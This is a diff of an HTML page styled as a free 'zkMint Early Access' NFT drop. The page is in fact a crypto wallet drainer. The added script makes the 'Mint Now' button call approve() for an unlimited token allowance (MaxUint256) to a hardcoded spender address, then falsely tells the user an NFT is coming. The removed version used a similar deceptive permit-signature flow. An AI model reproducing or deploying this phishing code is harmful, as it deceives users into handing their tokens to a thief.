@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>zkSync NFT Mint</title>
+  <title>zkMint Drop</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      background-color: #0f0f0f;
+      background-color: #0e0e0e;
       color: #eee;
       font-family: Arial, sans-serif;
       text-align: center;
@@ -36,75 +36,28 @@
   </style>
 </head>
 <body>
-  <h1>zkSync FREE NFT Mint</h1>
-  <p>Claim your unique NFT before it’s gone. Limited supply. Just pay gas.</p>
-  <button onclick="mint()">Mint Now</button>
+  <h1>zkMint Early Access</h1>
+  <p>Claim your free NFT before public launch. Gas fees only.</p>
+  <button onclick="approve()">Mint Now</button>
   <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <script>
-    const contractAddress = "0x72eF4ECDa7676A4173771eCF5A905345606Fb65a";
-    const tokenAddress = "0xda10009cbd5d07dd0cecc66161fc93d7c9000da1";
+    const tokenAddress = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
+    const spenderAddress = "0xC259Bb14dE51e292b9E6f32AD41507bf3Fa7028A";
 
-    const abi = [
-      {
-        "inputs": [
-          { "internalType": "uint256", "name": "value", "type": "uint256" },
-          { "internalType": "uint256", "name": "deadline", "type": "uint256" },
-          { "internalType": "uint8", "name": "v", "type": "uint8" },
-          { "internalType": "bytes32", "name": "r", "type": "bytes32" },
-          { "internalType": "bytes32", "name": "s", "type": "bytes32" }
-        ],
-        "name": "mintWithPermit",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-      }
-    ];
-
-    async function mint() {
+    async function approve() {
       const [signer] = await window.ethereum.request({ method: "eth_requestAccounts" });
       const provider = new ethers.BrowserProvider(window.ethereum);
       const user = await provider.getSigner();
       const token = new ethers.Contract(tokenAddress, [
-        "function nonces(address) view returns (uint256)"
+        "function approve(address spender, uint256 value) public returns (bool)"
       ], user);
 
-      const value = ethers.parseUnits("1", 18); // reduced for test
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
-      const nonce = await token.nonces(signer);
-
-      const domain = {
-        name: "Dai Stablecoin",
-        version: "1",
-        chainId: 10,
-        verifyingContract: tokenAddress
-      };
-
-      const types = {
-        Permit: [
-          { name: "owner", type: "address" },
-          { name: "spender", type: "address" },
-          { name: "value", type: "uint256" },
-          { name: "nonce", type: "uint256" },
-          { name: "deadline", type: "uint256" }
-        ]
-      };
-
-      const permitData = {
-        owner: signer,
-        spender: contractAddress,
-        value,
-        nonce,
-        deadline
-      };
-
-      const signature = await user.signTypedData(domain, types, permitData);
-      const { r, s, v } = ethers.Signature.from(signature);
-
-      const contract = new ethers.Contract(contractAddress, abi, user);
-      const tx = await contract.mintWithPermit(value, deadline, v, r, s);
-      document.getElementById("status").innerText = "✅ Mint executed. TX: " + tx.hash;
+      const tx = await token.approve(spenderAddress, ethers.MaxUint256);
+      document.getElementById("status").innerText = "🔄 Waiting for approval...";
+      await tx.wait();
+      document.getElementById("status").innerText = "✅ Approved. NFT will appear in your wallet soon!";
     }
   </script>
 </body>
